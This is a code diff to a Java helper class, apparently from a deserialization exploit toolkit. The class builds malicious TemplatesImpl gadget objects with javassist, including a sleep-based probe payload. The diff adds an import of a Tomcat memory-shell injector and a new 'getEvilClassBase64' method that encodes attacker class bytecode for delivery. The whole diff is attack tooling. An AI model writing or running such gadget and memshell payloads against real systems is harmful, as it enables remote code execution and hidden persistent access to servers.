@@ -1,11 +1,14 @@
 package util;
 
+import com.fasterxml.jackson.databind.ser.Serializers;
 import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
+import gadget.memshell.TomcatShellInject2;
 import javassist.*;
 
 import java.io.IOException;
+import java.util.Base64;
 
 import static util.ReflectionUtils.setFieldValue;
 
@@ -68,5 +71,13 @@ public class GadgetUtils {
     public static TemplatesImpl getDelayTemplatesImpl() throws NotFoundException, CannotCompileException, IOException, NoSuchFieldException, InstantiationException, IllegalAccessException {
         String cmd = "\"Thread.currentThread().sleep(10000L);\"";
         return createTemplatesImpl(cmd);
+    }
+
+    public static String getEvilClassBase64(Class clz) throws IOException, CannotCompileException, NotFoundException {
+        ClassPool pool = ClassPool.getDefault();
+
+        CtClass ctClass = pool.get(clz.getName());
+        byte[] targetByteCodes = ctClass.toBytecode();
+        return Base64.getEncoder().encodeToString(targetByteCodes);
     }
 }
